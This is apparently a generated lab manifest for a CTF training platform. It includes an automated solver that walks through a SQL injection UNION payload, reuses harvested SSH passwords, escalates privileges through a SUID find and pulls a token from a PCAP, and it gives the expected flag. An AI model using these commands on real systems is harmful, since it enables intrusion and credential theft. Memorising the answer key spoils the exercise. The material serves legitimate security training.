@@ -1,0 +1,48 @@
+# Generated from platform/labs/Linux/linux-5-7-black-box-ctf/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-5-7-black-box-ctf
+track: Linux
+difficulty: advanced
+source: platform/labs/Linux/linux-5-7-black-box-ctf/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-5-7-black-box-ctf.sh
+  steps:
+  - name: SQL injection on server-alpha extracts token 1
+    command: curl -s 'http://{target.server-alpha}/search?q=%27%20UNION%20SELECT%201%2Cflag_value%2C3%2C4%20FROM%20secrets--%20-' | grep -o 't1t4n'
+    expect: t1t4n
+  - name: Find SSH credentials in server-bravo HTML source
+    command: curl -s http://{target.server-bravo}/ | grep -o 'contractor / T1t4n_C0ntr4ct#'
+    expect: contractor / T1t4n_C0ntr4ct#
+  - name: SSH to server-bravo as contractor and pivot to sysadmin for token 2
+    command: sshpass -p 'T1t4n_Sys_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.server-bravo} 'cat /home/sysadmin/marker.txt' 2>&1
+    expect: bl4ck
+  - name: SSH to server-charlie as operator
+    command: sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'whoami' 2>&1
+    expect: operator
+  - name: SUID find exploit to read token 3 from /root/flag.txt
+    command: sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /root -name flag.txt -exec cat {} \;' 2>&1
+    expect: b0x
+  - name: Read analyst credentials from server-charlie
+    command: sshpass -p 'T1t4n_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null operator@{target.server-charlie} 'find /opt/titan -name credentials.txt -exec cat {} \;' 2>&1 | grep -o 'T1t4n_4n4lyst#'
+    expect: T1t4n_4n4lyst#
+  - name: SSH to server-delta and extract token 4 from PCAP
+    command: sshpass -p 'T1t4n_4n4lyst#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null analyst@{target.server-delta} 'strings /home/analyst/evidence/traffic.pcap | grep -o "token=pwn" | head -1 | sed "s/token=//"' 2>&1
+    expect: pwn
+  - name: Assemble and verify complete flag
+    command: echo 'OCR{t1t4n_bl4ck_b0x_pwn}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{t1t4n_bl4ck_b0x_pwn}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
